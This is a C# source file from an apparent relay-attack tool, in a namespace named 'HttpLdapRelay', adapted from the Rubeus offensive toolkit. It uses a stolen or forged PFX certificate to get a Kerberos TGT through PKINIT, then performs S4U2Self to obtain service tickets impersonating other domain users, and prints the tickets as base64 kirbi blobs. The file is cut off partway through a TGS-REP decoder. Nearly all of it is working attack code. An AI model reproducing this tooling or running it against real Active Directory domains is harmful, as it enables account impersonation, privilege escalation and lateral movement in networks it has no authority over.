// PKINITClient.cs - PKINIT Authentication Client with S4U2Self support
// Adapted from Rubeus (GhostPack) - BSD 3-Clause License

using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace HttpLdapRelay.Kerberos
{
    public class PKINITClient : IDisposable
    {
        private readonly string _kdcHost;
        private readonly int _kdcPort;
        private byte[] _tgtBytes;
        private byte[] _sessionKey;
        private Interop.KERB_ETYPE _sessionKeyType;
        private string _clientRealm;
        private string _clientName;
        private EncKDCRepPart _encRepPart;
        private AS_REP _asRep;

        // Key usage for PA-FOR-USER checksum (MS-SFU)
        private const int KU_PA_FOR_USER_CHECKSUM = 17;

        public byte[] TGTBytes => _tgtBytes;
        public byte[] SessionKey => _sessionKey;
        public Interop.KERB_ETYPE SessionKeyType => _sessionKeyType;
        public string ClientRealm => _clientRealm;
        public string ClientName => _clientName;

        public PKINITClient(string kdcHost, int kdcPort = 88)
        {
            _kdcHost = kdcHost;
            _kdcPort = kdcPort;
        }

        /// <summary>
        /// Request a TGT using PKINIT with a certificate
        /// </summary>
        public bool GetTGT(string domain, string username, byte[] pfxBytes, string pfxPassword)
        {
            try
            {
                Console.WriteLine($"[*] Loading certificate from PFX...");

                X509Certificate2 cert = new X509Certificate2(
                    pfxBytes,
                    pfxPassword ?? "",
                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.MachineKeySet
                );

                if (!cert.HasPrivateKey)
                {
                    Console.WriteLine("[!] Certificate does not have a private key");
                    return false;
                }


                //Console.WriteLine("[*] Generating Diffie-Hellman key pair...");
                KDCKeyAgreement agreement = new KDCKeyAgreement();

                //Console.WriteLine($"[*] Building AS-REQ (w/ PKINIT preauth) for: '{domain}\\{username}'");
                AS_REQ asReq = new AS_REQ(username, domain, cert, agreement, Interop.KERB_ETYPE.aes256_cts_hmac_sha1);

                byte[] asReqBytes = asReq.Encode();
                //Console.WriteLine($"[*] AS-REQ size: {asReqBytes.Length} bytes");

                //Console.WriteLine($"[*] Sending AS-REQ to {_kdcHost}:{_kdcPort}...");
                byte[] response = SendToKDC(asReqBytes);

                if (response == null || response.Length == 0)
                {
                    Console.WriteLine("[!] No response from KDC");
                    return false;
                }

                //Console.WriteLine($"[*] Received {response.Length} bytes from KDC");

                return HandleASResponse(response, asReq, agreement);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] PKINIT error: {ex.Message}");
                if (ex.InnerException != null)
                    Console.WriteLine($"[!] Inner: {ex.InnerException.Message}");
                return false;
            }
        }

        private bool HandleASResponse(byte[] response, AS_REQ asReq, KDCKeyAgreement agreement)
        {
            AsnElt responseAsn = AsnElt.Decode(response);

            if (responseAsn.TagClass == AsnElt.APPLICATION && responseAsn.TagValue == 30)
            {
                KRB_ERROR error = KRB_ERROR.Decode(responseAsn);
                Console.WriteLine($"[!] KRB-ERROR ({error.error_code}): {error.GetErrorMessage()}");
                if (!string.IsNullOrEmpty(error.e_text))
                    Console.WriteLine($"[!] Error text: {error.e_text}");
                return false;
            }

            if (responseAsn.TagClass != AsnElt.APPLICATION || responseAsn.TagValue != 11)
            {
                Console.WriteLine($"[!] Unexpected response type: class={responseAsn.TagClass}, tag={responseAsn.TagValue}");
                return false;
            }

            //Console.WriteLine("[+] AS-REP received successfully!");
            _asRep = AS_REP.Decode(responseAsn);

            _clientRealm = _asRep.crealm;
            _clientName = _asRep.cname?.name_string?[0];

            Console.WriteLine($"[*] Client: {_clientName}@{_clientRealm}");

            PA_PK_AS_REP pkAsRep = null;
            if (_asRep.padata != null)
            {
                foreach (var pa in _asRep.padata)
                {
                    if (pa.type == Interop.PADATA_TYPE.PA_PK_AS_REP)
                    {
                        //Console.WriteLine("[*] Found PA-PK-AS-REP, parsing DH reply...");
                        pkAsRep = PA_PK_AS_REP.Decode(pa.value);
                        break;
                    }
                }
            }

            if (pkAsRep == null || pkAsRep.DHRepInfo == null)
            {
                Console.WriteLine("[!] No PA-PK-AS-REP found in response");
                return false;
            }

            //Console.WriteLine("[*] Deriving session key from DH exchange...");

            var dhKeyInfo = pkAsRep.DHRepInfo.KDCDHKeyInfo;
            if (dhKeyInfo == null || dhKeyInfo.SubjectPublicKey == null)
            {
                Console.WriteLine("[!] Could not extract KDC DH public key");
                return false;
            }

            int keySize = GetKeySize((Interop.KERB_ETYPE)_asRep.enc_part.etype);

            byte[] sessionKey = agreement.GenerateKey(
                dhKeyInfo.SubjectPublicKey,
                new byte[0],
                pkAsRep.DHRepInfo.ServerDHNonce,
                keySize
            );

            //Console.WriteLine($"[*] Session key derived ({keySize} bytes, etype={(Interop.KERB_ETYPE)_asRep.enc_part.etype})");

            //Console.WriteLine("[*] Decrypting AS-REP enc-part...");
            byte[] decryptedPart;
            try
            {
                decryptedPart = Crypto.Decrypt(
                    sessionKey,
                    _asRep.enc_part.cipher,
                    (Interop.KERB_ETYPE)_asRep.enc_part.etype,
                    Crypto.KU_AS_REP_ENCPART
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to decrypt AS-REP: {ex.Message}");
                return false;
            }

            //Console.WriteLine("[*] Parsing EncASRepPart...");
            _encRepPart = EncKDCRepPart.Decode(decryptedPart);

            _sessionKey = _encRepPart.key.keyvalue;
            _sessionKeyType = (Interop.KERB_ETYPE)_encRepPart.key.keytype;
            _tgtBytes = _asRep.ticket.RawBytes;

            //Console.WriteLine($"[+] TGT session key type: {_sessionKeyType}");
            Console.WriteLine($"[+] TGT valid until: {_encRepPart.endtime}");
            Console.WriteLine($"[+] PKINIT authentication successful!");

            byte[] kirbi = BuildKirbi(_asRep, _encRepPart);
            Console.WriteLine($"[*] Kirbi: {Convert.ToBase64String(kirbi)}");

            return true;
        }

        /// <summary>
        /// Perform S4U2Self to get a service ticket impersonating another user
        /// </summary>
        public byte[] S4U2Self(string targetUser, string targetSPN = null)
        {
            if (_sessionKey == null || _tgtBytes == null)
            {
                Console.WriteLine("[!] No TGT available. Call GetTGT first.");
                return null;
            }

            Console.WriteLine($"[*] Performing S4U2Self for user: {targetUser}");

            try
            {
                // Build TGS-REQ with PA-FOR-USER
                byte[] tgsReqBytes = BuildS4U2SelfRequest(targetUser, targetSPN);

                //Console.WriteLine($"[*] Sending TGS-REQ (S4U2Self) to {_kdcHost}:{_kdcPort}...");
                byte[] response = SendToKDC(tgsReqBytes);

                if (response == null || response.Length == 0)
                {
                    Console.WriteLine("[!] No response from KDC");
                    return null;
                }

                //Console.WriteLine($"[*] Received {response.Length} bytes from KDC");

                return HandleTGSResponse(response, targetUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] S4U2Self error: {ex.Message}");
                return null;
            }
        }

        private byte[] BuildS4U2SelfRequest(string targetUser, string targetSPN)
        {
            // TGS-REQ ::= [APPLICATION 12] KDC-REQ

            // Build the service principal name
            // For S4U2Self, we request a ticket to ourselves or to a specific SPN
            PrincipalName sname;

            if (!string.IsNullOrEmpty(targetSPN))
            {
                // Parse SPN format: service/host (e.g., cifs/dc01.domain.com)
                if (targetSPN.Contains("/"))
                {
                    string[] spnParts = targetSPN.Split('/');
                    sname = new PrincipalName(Interop.PRINCIPAL_TYPE.NT_SRV_INST, spnParts[0], spnParts[1]);
                }
                else
                {
                    sname = new PrincipalName(Interop.PRINCIPAL_TYPE.NT_PRINCIPAL, targetSPN);
                }
            }
            else
            {
                // Default: request ticket for ourselves (the machine account)
                sname = new PrincipalName(Interop.PRINCIPAL_TYPE.NT_PRINCIPAL, _clientName);
            }

            // Create TGS-REQ body
            var reqBody = new TGS_REQ_BODY();
            reqBody.realm = _clientRealm;
            reqBody.sname = sname;
            reqBody.till = DateTime.UtcNow.AddDays(1);
            reqBody.nonce = GenerateNonce();
            reqBody.etypes = new List<Interop.KERB_ETYPE> { _sessionKeyType };
            reqBody.kdcOptions = Interop.KdcOptions.FORWARDABLE |
                                 Interop.KdcOptions.RENEWABLE |
                                 Interop.KdcOptions.CANONICALIZE;

            byte[] reqBodyBytes = reqBody.Encode();

            // Build Authenticator
            var authenticator = BuildAuthenticator(_clientRealm, _clientName, reqBody.nonce);
            byte[] encAuthenticator = Crypto.Encrypt(_sessionKey, authenticator, _sessionKeyType, Crypto.KU_TGS_REQ_AUTH);

            // Build PA-TGS-REQ (AP-REQ)
            byte[] apReq = BuildAPReq(_tgtBytes, encAuthenticator);

            // Build PA-FOR-USER (S4U2Self)
            byte[] paForUser = BuildPAForUser(targetUser, _clientRealm);

            // Build the TGS-REQ
            var tgsReq = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeInteger(5)), // pvno
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeInteger(Interop.TGS_REQ)), // msg-type
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, AsnElt.MakeSequence(
                    // PA-TGS-REQ
                    AsnElt.MakeSequence(
                        AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeInteger((int)Interop.PADATA_TYPE.PA_TGS_REQ)),
                        AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeOctetString(apReq))
                    ),
                    // PA-FOR-USER
                    AsnElt.MakeSequence(
                        AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeInteger((int)Interop.PADATA_TYPE.PA_FOR_USER)),
                        AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeOctetString(paForUser))
                    )
                )),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 4, AsnElt.Decode(reqBodyBytes))
            );

            var appTgsReq = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 12,
                Constructed = true,
                Sub = new AsnElt[] { tgsReq }
            };

            return appTgsReq.Encode();
        }

        private byte[] BuildAuthenticator(string realm, string clientName, uint nonce)
        {
            // Authenticator ::= [APPLICATION 2] SEQUENCE {
            //   authenticator-vno [0] INTEGER,
            //   crealm [1] Realm,
            //   cname [2] PrincipalName,
            //   cksum [3] Checksum OPTIONAL,
            //   cusec [4] Microseconds,
            //   ctime [5] KerberosTime,
            //   subkey [6] EncryptionKey OPTIONAL,
            //   seq-number [7] UInt32 OPTIONAL
            // }

            DateTime ctime = DateTime.UtcNow;
            int cusec = ctime.Millisecond * 1000;

            var cname = new PrincipalName(Interop.PRINCIPAL_TYPE.NT_PRINCIPAL, clientName);

            var authenticator = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(5)), // authenticator-vno
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeGeneralString(realm)), // crealm
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, cname.Encode()), // cname
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 4, AsnElt.MakeInteger(cusec)), // cusec
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 5, AsnElt.MakeGeneralizedTime(ctime)) // ctime
            );

            var appAuth = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 2,
                Constructed = true,
                Sub = new AsnElt[] { authenticator }
            };

            return appAuth.Encode();
        }

        private byte[] BuildAPReq(byte[] ticket, byte[] encAuthenticator)
        {
            // AP-REQ ::= [APPLICATION 14] SEQUENCE {
            //   pvno [0] INTEGER,
            //   msg-type [1] INTEGER,
            //   ap-options [2] APOptions,
            //   ticket [3] Ticket,
            //   authenticator [4] EncryptedData
            // }

            byte[] apOptions = new byte[] { 0x00, 0x00, 0x00, 0x00 };

            var encData = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger((int)_sessionKeyType)),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeOctetString(encAuthenticator))
            );

            var apReq = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(5)), // pvno
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeInteger(Interop.AP_REQ)), // msg-type
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeBitString(apOptions)), // ap-options
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, AsnElt.Decode(ticket)), // ticket
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 4, encData) // authenticator
            );

            var appApReq = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 14,
                Constructed = true,
                Sub = new AsnElt[] { apReq }
            };

            return appApReq.Encode();
        }

        private byte[] BuildPAForUser(string userName, string realm)
        {
            // PA-FOR-USER ::= SEQUENCE {
            //   userName [0] PrincipalName,
            //   userRealm [1] Realm,
            //   cksum [2] Checksum,
            //   auth-package [3] KerberosString
            // }

            var userPrincipal = new PrincipalName(Interop.PRINCIPAL_TYPE.NT_ENTERPRISE, userName);
            string authPackage = "Kerberos";

            // Build data to checksum according to MS-SFU:
            // S4UByteArray = name-type (4 bytes LE) || name-string || realm || "Kerberos"
            List<byte> checksumData = new List<byte>();

            // Name type as little-endian int32
            int nameType = (int)Interop.PRINCIPAL_TYPE.NT_ENTERPRISE;
            checksumData.Add((byte)(nameType & 0xFF));
            checksumData.Add((byte)((nameType >> 8) & 0xFF));
            checksumData.Add((byte)((nameType >> 16) & 0xFF));
            checksumData.Add((byte)((nameType >> 24) & 0xFF));

            // Name string (the username itself)
            checksumData.AddRange(Encoding.UTF8.GetBytes(userName));

            // Realm (uppercase)
            checksumData.AddRange(Encoding.UTF8.GetBytes(realm.ToUpper()));

            // Auth package
            checksumData.AddRange(Encoding.UTF8.GetBytes(authPackage));

            // Compute KERB_CHECKSUM_HMAC_MD5 (-138) checksum
            // This uses the RFC 4757 algorithm for type -138
            byte[] cksum = ComputeKerbChecksumHmacMd5(_sessionKey, checksumData.ToArray(), KU_PA_FOR_USER_CHECKSUM);

            // Checksum structure
            // Checksum ::= SEQUENCE {
            //   cksumtype [0] Int32 (-138 for HMAC-MD5),
            //   checksum [1] OCTET STRING
            // }
            var checksumElt = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(-138)), // KERB_CHECKSUM_HMAC_MD5
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeOctetString(cksum))
            );

            var paForUser = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, userPrincipal.Encode()),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeGeneralString(realm.ToUpper())),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, checksumElt),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, AsnElt.MakeGeneralString(authPackage))
            );

            return paForUser.Encode();
        }

        /// <summary>
        /// Compute KERB_CHECKSUM_HMAC_MD5 (-138) checksum according to RFC 4757
        /// Algorithm:
        /// 1. Ksign = HMAC-MD5(Key, "signaturekey\0")
        /// 2. tmp = MD5(usage || data)
        /// 3. checksum = HMAC-MD5(Ksign, tmp)
        /// </summary>
        private byte[] ComputeKerbChecksumHmacMd5(byte[] key, byte[] data, int usage)
        {
            // Step 1: Derive signing key
            // Ksign = HMAC-MD5(Key, "signaturekey\0")
            byte[] signatureKeyString = Encoding.ASCII.GetBytes("signaturekey\0");
            byte[] ksign;
            using (var hmac = new HMACMD5(key))
            {
                ksign = hmac.ComputeHash(signatureKeyString);
            }

            // Step 2: Compute MD5(usage || data)
            // Usage is 4 bytes little-endian
            byte[] usageBytes = BitConverter.GetBytes(usage);
            if (!BitConverter.IsLittleEndian)
                Array.Reverse(usageBytes);

            byte[] tmp;
            using (var md5 = MD5.Create())
            {
                // Concatenate usage + data and hash
                byte[] toHash = new byte[4 + data.Length];
                Array.Copy(usageBytes, 0, toHash, 0, 4);
                Array.Copy(data, 0, toHash, 4, data.Length);
                tmp = md5.ComputeHash(toHash);
            }

            // Step 3: Compute final checksum = HMAC-MD5(Ksign, tmp)
            byte[] checksum;
            using (var hmac = new HMACMD5(ksign))
            {
                checksum = hmac.ComputeHash(tmp);
            }

            return checksum;
        }

        private byte[] HandleTGSResponse(byte[] response, string targetUser)
        {
            AsnElt responseAsn = AsnElt.Decode(response);

            if (responseAsn.TagClass == AsnElt.APPLICATION && responseAsn.TagValue == 30)
            {
                KRB_ERROR error = KRB_ERROR.Decode(responseAsn);
                Console.WriteLine($"[!] KRB-ERROR ({error.error_code}): {error.GetErrorMessage()}");
                if (!string.IsNullOrEmpty(error.e_text))
                    Console.WriteLine($"[!] Error text: {error.e_text}");
                return null;
            }

            if (responseAsn.TagClass != AsnElt.APPLICATION || responseAsn.TagValue != 13)
            {
                Console.WriteLine($"[!] Unexpected response type: class={responseAsn.TagClass}, tag={responseAsn.TagValue}");
                return null;
            }

            //Console.WriteLine("[+] TGS-REP received successfully!");

            // Parse TGS-REP (similar structure to AS-REP)
            var tgsRep = TGS_REP.Decode(responseAsn);

            Console.WriteLine($"[*] Service ticket for: {tgsRep.ticket?.sname?.name_string?[0]}");

            // Decrypt enc-part with TGT session key
            byte[] decryptedPart;
            try
            {
                decryptedPart = Crypto.Decrypt(
                    _sessionKey,
                    tgsRep.enc_part.cipher,
                    (Interop.KERB_ETYPE)tgsRep.enc_part.etype,
                    Crypto.KU_TGS_REP_ENCPART
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to decrypt TGS-REP: {ex.Message}");
                return null;
            }

            EncKDCRepPart encTgsRepPart = EncKDCRepPart.Decode(decryptedPart);
            Console.WriteLine();
            Console.WriteLine($"[+] S4U2Self successful!");
            //Console.WriteLine($"[+] Service ticket session key type: {(Interop.KERB_ETYPE)encTgsRepPart.key.keytype}");
            Console.WriteLine($"[+] Ticket valid until: {encTgsRepPart.endtime}");
            Console.WriteLine($"[+] Impersonating: {targetUser}");

            // Build kirbi for the service ticket
            byte[] kirbi = BuildKirbiFromTGS(tgsRep, encTgsRepPart, targetUser);
            Console.WriteLine($"[*] S4U2Self Kirbi: {Convert.ToBase64String(kirbi)}");

            return kirbi;
        }

        private byte[] BuildKirbi(AS_REP asRep, EncKDCRepPart encPart)
        {
            // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
            //   pvno [0] INTEGER,
            //   msg-type [1] INTEGER,
            //   tickets [2] SEQUENCE OF Ticket,
            //   enc-part [3] EncryptedData
            // }

            // Build KrbCredInfo according to RFC 4120
            // KrbCredInfo ::= SEQUENCE {
            //   key        [0] EncryptionKey,
            //   prealm     [1] Realm OPTIONAL,         -- client realm
            //   pname      [2] PrincipalName OPTIONAL, -- client principal name
            //   flags      [3] TicketFlags OPTIONAL,
            //   authtime   [4] KerberosTime OPTIONAL,
            //   starttime  [5] KerberosTime OPTIONAL,
            //   endtime    [6] KerberosTime OPTIONAL,
            //   renew-till [7] KerberosTime OPTIONAL,
            //   srealm     [8] Realm OPTIONAL,         -- service realm
            //   sname      [9] PrincipalName OPTIONAL  -- service principal name
            // }

            List<AsnElt> elements = new List<AsnElt>();

            // [0] key - session key
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, encPart.key.Encode()));

            // [1] prealm - client realm
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeGeneralString(asRep.crealm)));

            // [2] pname - client principal name
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, asRep.cname.Encode()));

            // [3] flags - ticket flags
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, encPart.flags.Encode()));

            // [4] authtime
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 4, AsnElt.MakeGeneralizedTime(encPart.authtime)));

            // [5] starttime
            if (encPart.starttime.HasValue)
            {
                elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 5, AsnElt.MakeGeneralizedTime(encPart.starttime.Value)));
            }

            // [6] endtime
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 6, AsnElt.MakeGeneralizedTime(encPart.endtime)));

            // [7] renew-till
            if (encPart.renew_till.HasValue)
            {
                elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 7, AsnElt.MakeGeneralizedTime(encPart.renew_till.Value)));
            }

            // [8] srealm - service realm
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 8, AsnElt.MakeGeneralString(encPart.srealm)));

            // [9] sname - service principal name (krbtgt/REALM)
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 9, encPart.sname.Encode()));

            var krbCredInfo = AsnElt.MakeSequence(elements.ToArray());

            // Build EncKrbCredPart with APPLICATION 29 tag
            var encKrbCredPartInner = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeSequence(krbCredInfo))
            );

            var encKrbCredPart = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 29,
                Constructed = true,
                Sub = new AsnElt[] { encKrbCredPartInner }
            };

            byte[] encKrbCredPartBytes = encKrbCredPart.Encode();

            // Wrap in EncryptedData with null encryption (etype 0)
            var encData = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(0)), // etype = 0 (null)
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeOctetString(encKrbCredPartBytes))
            );

            // Build KRB-CRED
            var krbCredSeq = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(5)), // pvno
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeInteger(22)), // msg-type
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeSequence(asRep.ticket.Encode())), // tickets
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, encData) // enc-part
            );

            var krbCred = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 22,
                Constructed = true,
                Sub = new AsnElt[] { krbCredSeq }
            };

            return krbCred.Encode();
        }

        private byte[] BuildKirbiFromTGS(TGS_REP tgsRep, EncKDCRepPart encPart, string impersonatedUser)
        {
            // Build KrbCredInfo for service ticket according to RFC 4120
            // KrbCredInfo ::= SEQUENCE {
            //   key        [0] EncryptionKey,
            //   prealm     [1] Realm OPTIONAL,         -- client realm
            //   pname      [2] PrincipalName OPTIONAL, -- client principal name
            //   flags      [3] TicketFlags OPTIONAL,
            //   authtime   [4] KerberosTime OPTIONAL,
            //   starttime  [5] KerberosTime OPTIONAL,
            //   endtime    [6] KerberosTime OPTIONAL,
            //   renew-till [7] KerberosTime OPTIONAL,
            //   srealm     [8] Realm OPTIONAL,         -- service realm
            //   sname      [9] PrincipalName OPTIONAL  -- service principal name
            // }

            List<AsnElt> elements = new List<AsnElt>();

            // [0] key - session key
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, encPart.key.Encode()));

            // [1] prealm - client realm
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeGeneralString(tgsRep.crealm)));

            // [2] pname - client principal name (the impersonated user)
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, tgsRep.cname.Encode()));

            // [3] flags - ticket flags
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, encPart.flags.Encode()));

            // [4] authtime
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 4, AsnElt.MakeGeneralizedTime(encPart.authtime)));

            // [5] starttime
            if (encPart.starttime.HasValue)
            {
                elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 5, AsnElt.MakeGeneralizedTime(encPart.starttime.Value)));
            }

            // [6] endtime
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 6, AsnElt.MakeGeneralizedTime(encPart.endtime)));

            // [7] renew-till
            if (encPart.renew_till.HasValue)
            {
                elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 7, AsnElt.MakeGeneralizedTime(encPart.renew_till.Value)));
            }

            // [8] srealm - service realm (from the ticket's service name realm)
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 8, AsnElt.MakeGeneralString(encPart.srealm ?? tgsRep.crealm)));

            // [9] sname - service principal name
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 9, encPart.sname?.Encode() ?? tgsRep.ticket.sname.Encode()));

            var krbCredInfo = AsnElt.MakeSequence(elements.ToArray());

            var encKrbCredPartInner = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeSequence(krbCredInfo))
            );

            var encKrbCredPart = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 29,
                Constructed = true,
                Sub = new AsnElt[] { encKrbCredPartInner }
            };

            byte[] encKrbCredPartBytes = encKrbCredPart.Encode();

            var encData = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(0)),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeOctetString(encKrbCredPartBytes))
            );

            var krbCredSeq = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeInteger(5)),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeInteger(22)),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeSequence(tgsRep.ticket.Encode())),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, encData)
            );

            var krbCred = new AsnElt
            {
                TagClass = AsnElt.APPLICATION,
                TagValue = 22,
                Constructed = true,
                Sub = new AsnElt[] { krbCredSeq }
            };

            return krbCred.Encode();
        }

        private uint GenerateNonce()
        {
            byte[] nonceBytes = new byte[4];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(nonceBytes);
            }
            return BitConverter.ToUInt32(nonceBytes, 0) & 0x7FFFFFFF;
        }

        private int GetKeySize(Interop.KERB_ETYPE etype)
        {
            switch (etype)
            {
                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:
                    return 32;
                case Interop.KERB_ETYPE.aes128_cts_hmac_sha1:
                    return 16;
                case Interop.KERB_ETYPE.rc4_hmac:
                    return 16;
                default:
                    return 32;
            }
        }

        private byte[] SendToKDC(byte[] data)
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(_kdcHost, _kdcPort);

                using (NetworkStream stream = client.GetStream())
                {
                    byte[] lengthPrefix = new byte[4];
                    lengthPrefix[0] = (byte)((data.Length >> 24) & 0xFF);
                    lengthPrefix[1] = (byte)((data.Length >> 16) & 0xFF);
                    lengthPrefix[2] = (byte)((data.Length >> 8) & 0xFF);
                    lengthPrefix[3] = (byte)(data.Length & 0xFF);

                    stream.Write(lengthPrefix, 0, 4);
                    stream.Write(data, 0, data.Length);
                    stream.Flush();

                    byte[] respLengthBuf = new byte[4];
                    int read = 0;
                    while (read < 4)
                    {
                        int n = stream.Read(respLengthBuf, read, 4 - read);
                        if (n == 0) throw new Exception("Connection closed");
                        read += n;
                    }

                    int respLength = (respLengthBuf[0] << 24) | (respLengthBuf[1] << 16) |
                                     (respLengthBuf[2] << 8) | respLengthBuf[3];

                    byte[] response = new byte[respLength];
                    read = 0;
                    while (read < respLength)
                    {
                        int n = stream.Read(response, read, respLength - read);
                        if (n == 0) throw new Exception("Connection closed");
                        read += n;
                    }

                    return response;
                }
            }
        }

        public void Dispose()
        {
        }
    }

    /// <summary>
    /// TGS-REQ body structure
    /// </summary>
    public class TGS_REQ_BODY
    {
        public Interop.KdcOptions kdcOptions;
        public string realm;
        public PrincipalName sname;
        public DateTime till;
        public uint nonce;
        public List<Interop.KERB_ETYPE> etypes;

        public byte[] Encode()
        {
            List<AsnElt> elements = new List<AsnElt>();

            byte[] kdcOptionsBytes = BitConverter.GetBytes((uint)kdcOptions);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(kdcOptionsBytes);
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, AsnElt.MakeBitString(kdcOptionsBytes)));

            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeGeneralString(realm)));

            if (sname != null)
            {
                elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 3, sname.Encode()));
            }

            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 5, AsnElt.MakeGeneralizedTime(till)));
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 7, AsnElt.MakeInteger(nonce)));

            List<AsnElt> etypeElements = new List<AsnElt>();
            foreach (var etype in etypes)
            {
                etypeElements.Add(AsnElt.MakeInteger((int)etype));
            }
            elements.Add(AsnElt.MakeExplicit(AsnElt.CONTEXT, 8, AsnElt.MakeSequence(etypeElements.ToArray())));

            return AsnElt.MakeSequence(elements.ToArray()).Encode();
        }
    }

    /// <summary>
    /// TGS-REP structure (similar to AS-REP)
    /// </summary>
    public class TGS_REP
    {
        public int pvno;
        public int msg_type;
        public string crealm;
        public PrincipalName cname;
        public Ticket ticket;
        public EncryptedData enc_part;

        public static TGS_REP Decode(AsnElt ae)
        {
            // TGS-REP ::= [APPLICATION 13] KDC-REP
            if (ae.TagClass != AsnElt.APPLICATION || ae.TagValue != 13)
            {
                throw new Exception($"Expected TGS-REP (APPLICATION 13), got {ae.TagClass}, {ae.TagValue}");
            }

            TGS_REP rep = new TGS_REP();
            AsnElt kdcRep = ae.Sub[0];

            foreach (var sub in kdcRep.Sub)
            {
                if (sub.TagClass == AsnElt.CONTEXT)
                {
                    switch (sub.TagValue)
                    {
                        case 0:
